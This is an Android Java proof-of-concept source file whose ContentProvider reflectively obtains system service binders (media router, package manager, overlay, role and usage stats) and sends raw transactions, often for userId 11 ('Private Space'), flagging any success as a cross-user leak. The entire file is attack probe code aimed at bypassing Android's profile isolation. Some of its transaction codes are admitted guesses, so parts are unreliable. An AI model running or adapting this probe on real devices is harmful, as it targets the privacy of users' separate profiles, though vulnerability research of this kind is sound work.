package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class MediaRouterLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path == null) path = "/all";

        if (path.contains("router") || path.contains("all")) {
            testMediaRouter(cursor);
        }
        if (path.contains("pkg") || path.contains("all")) {
            testPackageManagerCrossUser(cursor);
        }
        if (path.contains("overlay") || path.contains("all")) {
            testOverlayManager(cursor);
        }
        if (path.contains("role") || path.contains("all")) {
            testRoleManager(cursor);
        }
        if (path.contains("usagestats") || path.contains("all")) {
            testUsageStatsManager(cursor);
        }

        return cursor;
    }

    private void testMediaRouter(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("media_router");
        if (binder == null) { cursor.addRow(new Object[]{"router_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"router_binder", "OK"});
        String desc = "android.media.IMediaRouterService";

        // IMediaRouterService methods expose connected Chromecast/cast devices
        // TX=1: registerClientAsUser
        // TX=2: unregisterClient
        // TX=3: getState - returns MediaRouterClientState (routes visible to client)
        // TX=4: isPlaybackActive
        // TX=5-8: select/deselect routes, etc

        // TX=1: registerClientAsUser(IMediaRouterClient, packageName, int userId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new StubBinder("android.media.IMediaRouterClient"));
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // userId
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"router_register_u0", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"router_register_u0", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"router_register_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try registering as different user (Private Space)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new StubBinder("android.media.IMediaRouterClient"));
            data.writeString(getContext().getPackageName());
            data.writeInt(11); // Private Space userId
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"router_register_u11", "SUCCESS_CROSSUSER!"});
            } else {
                cursor.addRow(new Object[]{"router_register_u11", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"router_register_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=3: getState(IMediaRouterClient) - get routing state
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new StubBinder("android.media.IMediaRouterClient"));
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"router_getState", "SUCCESS avail=" + avail});
                if (avail > 4) {
                    // Try to read MediaRouterClientState
                    int nonNull = reply.readInt();
                    if (nonNull != 0) {
                        int routeCount = reply.readInt();
                        cursor.addRow(new Object[]{"router_routes", "count=" + routeCount});
                    }
                }
            } else {
                cursor.addRow(new Object[]{"router_getState", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"router_getState", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Test all other TX codes
        for (int tx = 4; tx <= 15; tx++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"router_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int exVal = reply.readInt();
                    if (exVal == 0) {
                        cursor.addRow(new Object[]{"router_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"router_tx" + tx, "Ex=" + exVal + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"router_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testPackageManagerCrossUser(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("package");
        if (binder == null) { cursor.addRow(new Object[]{"pkg_binder", "NOT_FOUND"}); return; }
        String desc = "android.content.pm.IPackageManager";

        // Try getInstalledPackages for user 11 (Private Space)
        // TX code for getInstalledPackages varies by version
        // Let's try getPackageInfo for known packages in private space
        // Also try: getInstalledApplications(flags, userId)

        // First, try a simpler approach: queryIntentActivities with userId=11
        // In modern Android, PackageManager has internal userId handling

        // Actually, let's just try direct methods that take userId
        // getApplicationInfo(packageName, flags, userId) - from IPackageManager
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("com.google.android.apps.messaging"); // package
            data.writeLong(0); // flags (PackageManager.ApplicationInfoFlags)
            data.writeInt(11); // userId = Private Space
            // This is likely getApplicationInfo
            binder.transact(13, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int nonNull = reply.readInt();
                if (nonNull != 0) {
                    cursor.addRow(new Object[]{"pkg_getAppInfo_u11", "SUCCESS_CROSSUSER! data=" + reply.dataAvail()});
                } else {
                    cursor.addRow(new Object[]{"pkg_getAppInfo_u11", "SUCCESS but null (not installed in u11)"});
                }
            } else {
                cursor.addRow(new Object[]{"pkg_getAppInfo_u11", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"pkg_getAppInfo_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try getInstalledPackages(flags, userId) with user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeLong(0); // flags
            data.writeInt(11); // userId
            // getInstalledPackages is usually around TX=51-60 range
            binder.transact(56, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"pkg_getInstalled_u11_tx56", "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"pkg_getInstalled_u11_tx56", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"pkg_getInstalled_u11_tx56", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testOverlayManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("overlay");
        if (binder == null) { cursor.addRow(new Object[]{"overlay_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"overlay_binder", "OK"});
        String desc = "android.content.om.IOverlayManager";

        // IOverlayManager can list/enable overlay packages
        // getAllOverlays(int userId) - lists all runtime overlays
        // getOverlayInfosForTarget - get overlays targeting a package

        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0); // userId or other
                binder.transact(tx, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"overlay_tx" + tx, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    String s = truncate(msg);
                    if (s != null && s.contains("ermission")) {
                        cursor.addRow(new Object[]{"overlay_tx" + tx, "PERM:" + s});
                    } else {
                        cursor.addRow(new Object[]{"overlay_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"overlay_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testRoleManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("role");
        if (binder == null) { cursor.addRow(new Object[]{"role_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"role_binder", "OK"});
        String desc = "android.app.role.IRoleManager";

        // getRoleHolders(roleName, userId) - which app holds each role
        // isRoleAvailable(roleName) - check if role exists
        // getRoleHoldersAsUser - list holders for another user

        String[] roles = {"android.app.role.BROWSER", "android.app.role.DIALER",
            "android.app.role.SMS", "android.app.role.HOME",
            "android.app.role.ASSISTANT", "android.app.role.SYSTEM_GALLERY"};

        for (String role : roles) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(role);
                data.writeInt(0); // userId
                // getRoleHoldersAsUser is likely TX=5 or so
                binder.transact(5, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    String holders = "";
                    if (avail > 0) {
                        try {
                            int count = reply.readInt();
                            if (count > 0 && count < 50) {
                                StringBuilder sb = new StringBuilder();
                                for (int i = 0; i < count; i++) {
                                    String s = reply.readString();
                                    if (s != null) sb.append(s).append(",");
                                }
                                holders = " holders=" + sb.toString();
                            } else {
                                holders = " listSize=" + count;
                            }
                        } catch (Exception ignored) {
                            holders = " parseErr";
                        }
                    }
                    cursor.addRow(new Object[]{"role_" + role.replace("android.app.role.", ""), "SUCCESS" + holders});
                } else {
                    cursor.addRow(new Object[]{"role_" + role.replace("android.app.role.", ""), "Ex=" + ex + "|" + truncate(reply.readString())});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"role_" + role.replace("android.app.role.", ""), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Try getting role holders for user 11 (Private Space)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("android.app.role.BROWSER");
            data.writeInt(11); // Private Space
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"role_BROWSER_u11", "SUCCESS_CROSSUSER! avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"role_BROWSER_u11", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"role_BROWSER_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testUsageStatsManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("usagestats");
        if (binder == null) { cursor.addRow(new Object[]{"usage_binder", "NOT_FOUND"}); return; }
        cursor.addRow(new Object[]{"usage_binder", "OK"});
        String desc = "android.app.usage.IUsageStatsManager";

        // TX=1: queryUsageStats(int bucketType, long beginTime, long endTime, String callingPackage, int userId)
        // TX=4: queryEvents - detailed app usage events
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // INTERVAL_DAILY
            data.writeLong(System.currentTimeMillis() - 86400000L); // 24h ago
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // userId
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"usage_queryStats_u0", "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"usage_queryStats_u0", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"usage_queryStats_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try for user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0);
            data.writeLong(System.currentTimeMillis() - 86400000L);
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(11); // Private Space
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"usage_queryStats_u11", "SUCCESS_CROSSUSER! avail=" + reply.dataAvail()});
            } else {
                cursor.addRow(new Object[]{"usage_queryStats_u11", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"usage_queryStats_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) { this.descriptor = desc; attachInterface(null, desc); }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
